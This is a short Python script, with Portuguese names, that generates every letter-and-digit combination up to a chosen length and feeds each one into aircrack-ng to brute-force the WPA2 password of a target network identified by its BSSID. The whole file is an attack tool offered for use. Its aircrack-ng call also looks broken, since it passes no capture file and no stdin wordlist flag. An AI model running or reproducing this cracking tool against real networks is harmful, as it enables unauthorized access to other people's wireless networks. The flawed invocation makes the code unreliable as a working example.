import string
import itertools
import subprocess
import threading
import time

def gerar_combinacoes(tamanho_maximo):
    caracteres = string.ascii_letters + string.digits

    for tamanho in range(1, tamanho_maximo + 1):
        for combinacao in itertools.product(caracteres, repeat=tamanho):
            yield "".join(combinacao)

def gerar_e_testar_dicionario(modo_ataque, bssid, tamanho_maximo):
    try:
        opcoes = ["-a", modo_ataque, "-b", bssid]
        p = subprocess.Popen(['aircrack-ng'] + opcoes, stdin=subprocess.PIPE, text=True)
        
        for combinacao in gerar_combinacoes(tamanho_maximo):
            p.stdin.write(combinacao + "\n")
            p.stdin.flush()
            time.sleep(0.1)

        p.stdin.close()
        p.wait()
    except Exception as e:
        print("Ocorreu um erro:", e)

if __name__ == "__main__":
    modo_ataque = "2"  # 2 para WPA2
    bssid = input("Digite o BSSID da rede alvo: ")
    tamanho_maximo = int(input("Digite o tamanho máximo para as combinações: "))

    t = threading.Thread(target=gerar_e_testar_dicionario, args=(modo_ataque, bssid, tamanho_maximo))
    t.start()
    t.join()
